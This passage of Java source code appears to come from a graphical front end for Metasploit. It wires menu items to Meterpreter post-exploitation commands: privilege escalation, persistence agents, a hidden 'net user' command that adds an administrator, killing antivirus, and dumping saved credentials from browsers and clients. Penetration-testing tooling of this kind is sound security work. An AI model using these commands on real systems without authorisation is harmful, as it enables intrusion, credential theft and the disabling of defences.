		addSessionItem("Start system session with Panda Antivirus permission vulnerability",escalateMenu,
				"panda_2007_pavsrv51");
		addSessionItem("Start system session with SRT WebDrive permission vulnerability",escalateMenu,
				"srt_webdrive_priv");
		addScript("Get system privs",escalateMenu,"multi_console_command -cl \"use priv\",\"getsystem\"");
		addSessionItem("Brute force user/pass",escalateMenu,new WinbfOptionsDialog(getFrame()));

		JMenu accessMenu = new JMenu("Maintaining access");
		meterpreterPopupMenu.add(accessMenu);
		addScript("Install metsvc (listening agent)", accessMenu,"metsvc.rb");
		addScript("Run persistence (connect back agent)",accessMenu,new PersistenceOptionsDialog(getFrame()));
		addSessionItem("Open VNC",accessMenu,"vnc.rb -i");
		addScript("Setup RDP",accessMenu,new Object(){
			public String toString(){
				return "getgui.rb "+UserPassDialog.getUserPassOpts(getFrame());
			}
		});
		addScript("Setup telnet",accessMenu,new Object(){
			public String toString(){
				return "gettelnet.rb "+UserPassDialog.getUserPassOpts(getFrame());
			}
		});
		addSessionItem("Add admin user",accessMenu,new RpcAction(this) {
			String[] userPass = null;
			public void action(Map session) throws Exception {
				if(userPass == null)
					userPass = UserPassDialog.showUserPassDialog(getFrame());
				rpcConn.execute("session.meterpreter_write", session.get("id"),Base64.encode(
						("execute -H -f cmd -a \"/c net user "+userPass[0]+" "+userPass[1]+" /ADD " +
						"&& net localgroup Administrators "+userPass[0]+" /ADD\" \n").getBytes()));
			}
		});
		addScript("Kill AV",accessMenu,"killav");

		JMenu infoPopupMenu = new JMenu("System Information");
		meterpreterPopupMenu.add(infoPopupMenu);
		addSessionItem("Check if in VM",infoPopupMenu,"checkvm");
		addSessionItem("VMWare configurations",infoPopupMenu,"enum_vmware");
		addSessionItem("Past and current logged on users", infoPopupMenu, "enum_logged_on_users -l -c");
		addSessionItem("Domain admins",infoPopupMenu,"domain_list_gen");
		addSessionItem("Recent documents",infoPopupMenu,"dumplinks -e");
		addSessionItem("Recent programs (by prefetch)",infoPopupMenu,"prefetchtool -p -i");
		addSessionItem("Countermeasures",infoPopupMenu,
				"multi_console_command -cl \"run getcountermeasure -h\",\"run getcountermeasure\"");
		addSessionItem("Environment variables",infoPopupMenu,"get_env");
		addSessionItem("Powershell Environment",infoPopupMenu,"enum_powershell_env");
		addSessionItem("Subnets",infoPopupMenu,"get_local_subnets");
		addSessionItem("Firefox credentials and profile info", infoPopupMenu, "enum_firefox");
		addSessionItem("Pidgin credentials",infoPopupMenu,
				"multi_console_command -cl \"run get_pidgin_creds -h\",\"run get_pidgin_creds\"");
		addSessionItem("Filezilla credentials",infoPopupMenu,"get_filezilla_creds");
		addSessionItem("VNC credentials",infoPopupMenu,"getvncpw");
		addSessionItem("Putty credentials",infoPopupMenu,"enum_putty");
		addSessionItem("winenum: env vars, interfaces, routing, users, processes, tokens...",infoPopupMenu,"winenum");
		addSessionItem("Remote winenum: most of the above run against a different system",infoPopupMenu,
				new RemoteWinenumOptionsDialog(getFrame()));

		addSessionItem("Other",meterpreterPopupMenu,new RpcAction(this) {
			String command = null;
			public void action(Map session) throws Exception {
				if(command == null)
					command = JOptionPane.showInputDialog(getFrame(),
							"Enter a command","Run command on selected meterpreter sessions", JOptionPane.QUESTION_MESSAGE);
				rpcConn.execute("session.meterpreter_write", session.get("id"),Base64.encode(command.getBytes()));
			}
		});
		addSessionKillItem(meterpreterPopupMenu);
		
		//Setup generic menu (for vnc or whatever other sessions)
		sessionPopupMenu = new JPopupMenu();
		addSessionKillItem(sessionPopupMenu);
	}
	/** Adds a named session menu item to a given popup menu */
	private void addSessionItem(String name, JComponent menu,ActionListener action) {
		if(action == null)
			action = new RpcAction(null,this);
		JMenuItem tempItem = new JMenuItem(name);
		menu.add(tempItem);
		tempItem.addActionListener(action);
	}
	private void addSessionItem(String name, JComponent menu, Object action){
		addSessionItem(name, menu, new RpcAction(action,this));
	}
	private void addScript(final String name, JComponent menu, final RpcAction action){
		addSessionItem(name,menu,action);
		JMenuItem menuItem = new JMenuItem(name);
        menuItem.setName(name);
        menuItem.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                runOnAllMeterpreters("run "+action.getCmd(),name,statusMessageLabel);
            }
        });
        menuRunAllMeterp.add(menuItem);
	}
	private void addScript(String name, JComponent menu, Object action){
		addScript(name, menu, new RpcAction(action,this));
	}
	/** Adds a kill session menu item to a given popup menu */
	private void addSessionKillItem(JComponent popupMenu) throws HeadlessException {
		addSessionItem("Kill session",popupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.stop", session.get("id"));
			}
		});
	}
	
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JMenuItem addWorkspaceItem;
    private javax.swing.JMenuItem autoAddRouteItem;
    private javax.swing.JMenu auxiliaryMenu;
    private javax.swing.JMenuItem changeLFMenuItem;
    private javax.swing.JMenuItem clearHistoryItem;
    private javax.swing.JScrollPane clientsPane;
    private javax.swing.JTable clientsTable;
    private javax.swing.JMenu closeConsoleMenu;
    private javax.swing.JMenuItem collectedCredsMenuItem;
    private javax.swing.JMenuItem connectItem;
    private javax.swing.JMenuItem connectRpcMenuItem;
    private javax.swing.JMenu consoleMenu;
    private javax.swing.JMenuItem currWorkspaceItem;
    private javax.swing.JMenu databaseMenu;
    private javax.swing.JMenuItem dbCredcollectItem;
    private javax.swing.JMenuItem dbTrackerItem;
    private javax.swing.JMenuItem delWorkspaceItem;
    private javax.swing.JMenuItem disconnectItem;
    private javax.swing.JScrollPane eventsPane;
    private javax.swing.JTable eventsTable;
    private javax.swing.JMenu existingConsoleMenu;
    private javax.swing.JMenu exploitsMenu;
    private javax.swing.JMenu helpMenu;
    private javax.swing.JMenu historyMenu;
    private javax.swing.JScrollPane hostsPane;
    private javax.swing.JTable hostsTable;
    private javax.swing.JMenuItem importItem;
    private javax.swing.JMenuItem ipsFilterItem;
    private javax.swing.JPopupMenu.Separator jSeparator1;
    private javax.swing.JList jobsList;
    private javax.swing.JScrollPane jobsPane;
    private javax.swing.JMenuItem killSessionsMenuItem;
    private javax.swing.JMenuItem logGenerateMenuItem;
    private javax.swing.JScrollPane lootsPane;
    private javax.swing.JTable lootsTable;
    private javax.swing.JPanel mainPanel;
    private javax.swing.JMenuBar menuBar;
    private javax.swing.JMenu menuRunAllMeterp;
    private javax.swing.JMenuItem newConsoleItem;
    private javax.swing.JScrollPane notesPane;
    private javax.swing.JTable notesTable;
    private javax.swing.JMenuItem onlineHelpMenu;
    private javax.swing.JMenuItem otherPluginItem;
    private javax.swing.JMenu payloadsMenu;
    private javax.swing.JMenu pluginsMenu;
    private javax.swing.JMenu postMenu;
    private javax.swing.JProgressBar progressBar;
    public javax.swing.JMenu recentMenu;
    private javax.swing.JMenuItem refreshConsolesItem;
    private javax.swing.JMenuItem refreshItem;
    private javax.swing.JMenuItem searchItem;
    private javax.swing.JScrollPane servicesPane;
    private javax.swing.JTable servicesTable;
    private javax.swing.JScrollPane sessionsPane;
    private javax.swing.JTable sessionsTable;
    private javax.swing.JMenuItem showDetailsItem;
    private javax.swing.JMenuItem socketLoggerItem;
    private javax.swing.JMenuItem soundItem;
    private javax.swing.JMenuItem startRpcMenuItem;
    private javax.swing.JLabel statusAnimationLabel;
    private javax.swing.JLabel statusMessageLabel;
    private javax.swing.JPanel statusPanel;
    private javax.swing.JTabbedPane tabbedPane;
    private javax.swing.JMenuItem unloadPluginItem;
    private javax.swing.JScrollPane vulnsPane;
    private javax.swing.JTable vulnsTable;
    // End of variables declaration//GEN-END:variables
	private final Timer messageTimer;
	private final Timer busyIconTimer;
	private final Icon idleIcon;
	private final Icon[] busyIcons = new Icon[15];
	private int busyIconIndex = 0;
	private JDialog aboutBox;

	/** Sets look and feel of UI */
	private void setLnF(boolean toggle) {
		try {
			Element info = MsfguiApp.getPropertiesNode();
			boolean system = !info.getAttribute("LnF").equals("Metal");
			if (toggle) 
				system = !system;
			if (system) {
				UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
				info.setAttribute("LnF", "system");
			} else {
				// Set cross-platform Java L&F (also called "Metal")
				UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
				info.setAttribute("LnF", "Metal");
			}
			SwingUtilities.updateComponentTreeUI(this.getFrame());
			this.getFrame().pack();
		} catch (Exception e) {
			JOptionPane.showMessageDialog(getFrame(), e);
		}
	}

	/** Clear a table's contents, reenabling the tab, and replace with contents of data returned from a db call */
	private void reAddQuery(JTable table, int tabIndex, String call, String[] cols) {
		try {
			HashMap arg = new HashMap();
			arg.put("workspace", MsfguiApp.workspace);
			Object[] data = (Object[]) ((Map)rpcConn.execute("db."+call,arg)).get(call);
			reAdd(table, tabIndex, data, cols);
		} catch (MsfException mex) {
		}
	}
	private void reAdd(JTable table, int tabIndex, Object[] data, String[] cols) throws MsfException {
		DefaultTableModel mod = (DefaultTableModel) table.getModel();
		while (mod.getRowCount() > 0) {
			mod.removeRow(0);
		}
		for (Object dataObj : data) {
			Object[] row = new Object[cols.length];
			for (int i = 0; i < cols.length; i++)
				row[i] = ((Map) dataObj).get(cols[i]);
			mod.addRow(row);
		}
		TableHelper.fitColumnWidths(mod, table);
		tabbedPane.setEnabledAt(tabIndex, true);
	}

}
